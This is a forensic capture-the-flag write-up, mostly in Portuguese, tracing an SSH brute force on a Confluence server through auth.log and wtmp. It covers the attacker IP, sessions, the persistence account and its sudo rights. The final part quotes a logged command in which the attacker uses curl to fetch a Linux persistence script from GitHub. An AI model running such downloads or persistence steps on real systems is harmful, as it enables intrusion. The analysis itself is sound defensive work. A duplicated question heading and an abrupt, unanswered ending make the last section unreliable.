# Solution

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.


Antes de prosseguirmos com as perguntas, cabe nos perguntamos: O que é cada arqivo dentro do .zip?

`wtmp`: É um arquivo binário que salva todas as atividades de login (apenas sucesso), logouts e eventos do systema dentro de um Unix-like. Pode ser encontrado na pasta /var/log/wtmp ou /var/adm/wtmp. Contém um formato fixo de descrição, como o nome de usuário, terminal, host name ou
ip, hora e tipo do evento. 

`auth.log`: O auth.log é o arquivo de log responsável por registrar todos os eventos de autenticação do sistema, incluindo logins e logouts, tentativas de acesso bem-sucedidas e falhas, além de operações de PAM, SSH e sudo.

## 1. Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

Utilizando o auth.log, para vermos as tentativas de brute force, temos a seguinte análise: Entre 06:18 e 06:26, há várias entradas que indicam que o serviço CRON abriu e fechou sessões PAM (pam_unix) para usuário confluence (UID 998). Provavelmente para alguma tarefa agendada.

Às 6:19:52 alguém (203.101.190.9) consegue efetivamente, apartir de usuário e senha, entrar como root, com apenas uma tentativa.

Por volta das 06:31:31 começa inúmeras tentativas de login e senha no usuário "admin", configurando um brute-force. (IP 65.2.161.68).

Isso responde a primeira pergunta.

## 2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

Mar  6 06:31:39 ip-172-31-35-28 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2383]: Received disconnect from 65.2.161.68 port 46722:11: Bye Bye [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2383]: Disconnected from invalid user svc_account 65.2.161.68 port 46722 [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Received disconnect from 65.2.161.68 port 46732:11: Bye Bye [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Disconnected from invalid user svc_account 65.2.161.68 port 46732 [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)

06:31:40 O Threat actor consegue realizar o brute-force no root

Isso responde a segunda questão

## 3. Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

Isso é possível visualizar no auth.log, vamos usar um comando de pesquisa customizado: `grep sshd auth.log | grep -v pam_unix | grep 65.2.161.68 | grep -A3 'Accepted password'`; Ter apenas as linhas do DAEMON sshd, que tenha o pam_unix, com o IP do atacante e 
que tenha sido sucesso.

Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Received disconnect from 65.2.161.68 port 46698:11: Bye Bye [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Disconnected from invalid user server_adm 65.2.161.68 port 46698 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Received disconnect from 65.2.161.68 port 46710:11: Bye Bye [preauth]
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2

Por diferença de tempo, sabemos que no bruteforce há uma perda de conexão rápida quando há um sucesso. Estamos atrás de uma conexão manual, que justificaria sendo algo mais prolongado, não instantâneo. Para tanto, temos o login em 06:32:44 e logoff 06:37:24.
Mas o login é só no tempo do wtmp:

cyberjun pts/1        65.2.161.68      Wed Mar  6 00:37:35 2024   gone - no logout
root     pts/1        65.2.161.68      Wed Mar  6 00:32:45 2024 - Wed Mar  6 00:37:24 2024  (00:04)
root     pts/0        203.101.190.9    Wed Mar  6 00:19:55 2024   gone - no logout
reboot   system boot  6.2.0-1018-aws   Wed Mar  6 00:17:15 2024   still running
root     pts/1        203.101.190.9    Sun Feb 11 04:54:27 2024 - Sun Feb 11 05:08:04 2024  (00:13)
root     pts/1        203.101.190.9    Sun Feb 11 04:41:11 2024 - Sun Feb 11 04:41:46 2024  (00:00)
root     pts/0        203.101.190.9    Sun Feb 11 04:33:49 2024 - Sun Feb 11 05:08:04 2024  (00:34)
root     pts/0        203.101.190.9    Thu Jan 25 05:15:40 2024 - Thu Jan 25 06:34:34 2024  (01:18)
ubuntu   pts/0        203.101.190.9    Thu Jan 25 05:13:58 2024 - Thu Jan 25 05:15:12 2024  (00:01)
reboot   system boot  6.2.0-1017-aws   Thu Jan 25 05:12:17 2024 - Sun Feb 11 05:09:18 2024 (16+23:57)

06:32:45

Temos a resposta da terceira questão

## 4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

Seria o número da sessão imediatamente após o login: `grep systemd-logind auth.log`

systemd-logind é um serviço do systemd responsável por gerenciar logins e sessões de usuários em sistemas Linux . Ele mantém o controle de quem está logado, dos processos associados e do estado de ócio de cada sessão, além de oferecer integração com o Polkit para autorização de operações de sistema.

Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.


Nesse caso, temos a sessão brute-force 34 e a manual 37.

Temos a resposta da quarta questão.

## 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1


Evidentemente, o usuário criado para persistência é o "cyberjunkie"

## 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

Segundo o próprio site da MITRE ATT&CK: https://attack.mitre.org/techniques/T1136/001/
"ID: T1136.001"

## 7. What time did the attacker's first SSH session end according to auth.log?

Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session closed for user root
Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:36:01 ip-172-31-35-28 CRON[2640]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:36:01 ip-172-31-35-28 CRON[2641]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:36:01 ip-172-31-35-28 CRON[2641]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:36:01 ip-172-31-35-28 CRON[2640]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:37:01 ip-172-31-35-28 CRON[2654]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:37:01 ip-172-31-35-28 CRON[2653]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:37:01 ip-172-31-35-28 CRON[2654]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:37:01 ip-172-31-35-28 CRON[2653]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37


Esse é todo o caminho do threat actor na sessão 37, sua primeira sessão.

2024-03-06 06:37:24

## 8. What time did the attacker's first SSH session end according to auth.log?

Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh


